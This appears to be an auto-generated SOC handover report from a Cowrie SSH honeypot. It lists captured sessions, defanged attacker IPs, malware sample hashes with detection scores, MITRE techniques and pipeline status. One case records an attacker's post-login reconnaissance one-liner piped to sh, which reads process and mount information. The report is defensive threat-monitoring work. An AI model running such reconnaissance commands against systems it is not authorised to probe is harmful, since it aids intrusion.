| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 05:29:15` | `cowrie.session.connect` |
| `2026-04-28 05:29:15` | `cowrie.client.version` |
| `2026-04-28 05:29:15` | `cowrie.client.kex` |
| `2026-04-28 05:29:16` | `cowrie.login.success` |
| `2026-04-28 05:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.254.166[.]18` to AbuseIPDB if not already reported
- [ ] Block `205.254.166[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c247c6204e7

| Field | Detail |
|---|---|
| **Source IP** | `31.56.209[.]39` |
| **First Seen** | 2026-04-28 06:10 |
| **Last Seen** | 2026-04-28 06:10 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" | sh, cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps
` |
| **TTPs (MITRE)** | T1057 · T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 06:10:13` | `cowrie.session.connect` |
| `2026-04-28 06:10:13` | `cowrie.client.version` |
| `2026-04-28 06:10:13` | `cowrie.client.kex` |
| `2026-04-28 06:10:23` | `cowrie.login.success` |
| `2026-04-28 06:10:25` | `cowrie.client.size` |
| `2026-04-28 06:10:26` | `cowrie.session.params` |
| `2026-04-28 06:10:27` | `cowrie.command.input` |
| `2026-04-28 06:10:27` | `cowrie.command.input` |
| `2026-04-28 06:10:27` | `cowrie.command.failed` |
| `2026-04-28 06:10:27` | `cowrie.command.input` |
| `2026-04-28 06:10:35` | `cowrie.log.closed` |
| `2026-04-28 06:10:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.209[.]39` to AbuseIPDB if not already reported
- [ ] Block `31.56.209[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `113.141.70[.]64` | **215** | 2026-04-28 03:40 | 2026-04-28 03:48 | 401m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `35.205.77[.]107` | **32** | 2026-04-28 06:11 | 2026-04-28 06:12 | 3m | 4 | `T1110.001` | 🟠 MEDIUM |
| `34.78.69[.]136` | **3** | 2026-04-28 04:06 | 2026-04-28 04:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `35.240.0[.]184` | **2** | 2026-04-28 04:06 | 2026-04-28 04:06 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.200.236[.]207` | 1 | 2026-04-28 05:58 | 2026-04-28 06:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]218` | 1 | 2026-04-28 06:32 | 2026-04-28 06:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `158.180.79[.]132` | 1 | 2026-04-28 04:21 | 2026-04-28 04:21 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.10.86[.]130` | 1 | 2026-04-28 05:13 | 2026-04-28 05:13 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `205.254.166[.]18` | 1 | 2026-04-28 05:29 | 2026-04-28 05:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `3.134.216[.]108` | 1 | 2026-04-28 03:35 | 2026-04-28 03:36 | 10s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-28 03:34 | 2026-04-28 03:35 | 94s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.78.69[.]136` | BE | Google LLC | **100** ⚠️ | 0 |
| `205.254.166[.]18` | IN | Cogent Communications, LLC | **100** ⚠️ | 2 |
| `31.56.209[.]39` | NL | SWISSNET LLC | **100** ⚠️ | 50 |
| `35.205.77[.]107` | BE | Google LLC | **100** ⚠️ | 0 |
| `35.240.0[.]184` | BE | Google LLC | **100** ⚠️ | 0 |
| `158.180.79[.]132` | KR | oracle | **100** ⚠️ | 10 |
| `101.200.236[.]207` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `113.141.70[.]64` | CN | CHINANET SHAANXI PROVINCE NETWORK | **100** ⚠️ | 24 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `14.103.114[.]218` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 215 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 40 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 18 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (58 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 9 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 48 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 335 cases |
| Tool 34  | Credential Extractor        | ✅ 61 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 20 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 58 filtered (17.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 13 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 18 priority case(s) shown individually · 11 recon entry/entries in table (4 group(s) consolidating 252 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-28T06:33:48Z_
